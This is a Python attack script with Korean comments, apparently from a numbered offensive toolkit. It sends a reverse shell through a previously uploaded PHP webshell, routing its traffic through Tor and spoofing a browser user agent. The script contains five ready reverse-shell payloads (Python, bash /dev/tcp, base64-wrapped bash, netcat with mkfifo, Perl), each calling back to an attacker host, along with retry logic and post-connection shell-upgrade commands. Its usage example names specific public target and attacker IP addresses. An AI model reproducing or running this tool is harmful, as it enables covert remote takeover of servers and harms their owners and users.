#!/usr/bin/env python3
"""
조용한 리버스 쉘
테스트 명령 없이 바로 리버스 쉘만 전송
"""

import requests
import base64
import sys
import urllib.parse

def silent_reverse_shell(target_ip, webshell_file, param, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] 웹쉘: uploads/{webshell_file}")
    print(f"[*] 파라미터: {param}")
    print(f"[*] C2: {attacker_ip}:{attacker_port}")
    print(f"\n[!] 전략: 테스트 명령 없이 바로 리버스 쉘만 1회 전송")

    print(f"\n[!] C2 서버에서 리스너 시작:")
    print(f"    nc -lvnp {attacker_port}")

    input("\n[?] 준비되면 Enter...")

    # 리버스 쉘 페이로드 (1개만 선택)
    print("\n[*] 어떤 페이로드를 사용할까요?")
    print("1. Python (권장)")
    print("2. Bash")
    print("3. Base64")
    print("4. Netcat")
    print("5. Perl")

    choice = input("\n선택 (1-5, 기본: 1): ").strip() or "1"

    reverse_shell_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    b64_payload = base64.b64encode(reverse_shell_cmd.encode()).decode()

    payloads = {
        "1": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        "2": f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'",
        "3": f"echo {b64_payload}|base64 -d|bash",
        "4": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f",
        "5": f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    }

    payload = payloads.get(choice, payloads["1"])

    print(f"\n[*] 페이로드 타입: {['', 'Python', 'Bash', 'Base64', 'Netcat', 'Perl'][int(choice)]}")

    # post_exploit 방식: 여러 번 시도 + 백그라운드 실행
    attempts = int(input("\n[?] 몇 번 시도할까요? (기본: 5): ").strip() or "5")
    delay = int(input("[?] 시도 간격 (초, 기본: 3): ").strip() or "3")

    print(f"\n[*] {attempts}번 시도 시작 (간격: {delay}초)...")

    import time

    for i in range(1, attempts + 1):
        print(f"\n[{i}/{attempts}] 페이로드 전송 중...")

        try:
            # 백그라운드 실행 (post_exploit 방식)
            bg_payload = f"{payload} &"

            url = f"{base_url}/file.php?name=uploads/{webshell_file}&{param}={urllib.parse.quote(bg_payload)}"

            resp = session.get(url, timeout=5)

            if resp.status_code == 200:
                print(f"    [+] 200 OK")
            else:
                print(f"    [?] Status: {resp.status_code}")

        except requests.exceptions.Timeout:
            print(f"    [+] 타임아웃 (연결되었을 가능성!)")
        except Exception as e:
            print(f"    [-] 오류: {str(e)[:50]}")

        # 중간 체크
        if i < attempts:
            check = input(f"\n[?] C2 연결 확인됐나요? (y=중단, Enter=계속): ").strip().lower()
            if check == 'y':
                print("[+] 리버스 쉘 연결 성공!")
                return

            print(f"[*] {delay}초 대기...")
            time.sleep(delay)

    print(f"\n[+] {attempts}번 시도 완료")
    print(f"[!] C2 리스너를 확인하세요")
    print(f"\n[*] 연결 후 다음 명령 실행:")
    print(f"    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print(f"    export TERM=xterm")

def main():
    if len(sys.argv) < 5:
        print("사용법: python3 91_silent_reverse_shell.py <TARGET> <WEBSHELL> <PARAM> <ATTACKER_IP> <PORT>")
        print("예시: python3 91_silent_reverse_shell.py 43.201.154.142 shell_4727.php x 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    webshell_file = sys.argv[2]
    param = sys.argv[3]
    attacker_ip = sys.argv[4]
    attacker_port = int(sys.argv[5])

    silent_reverse_shell(target_ip, webshell_file, param, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
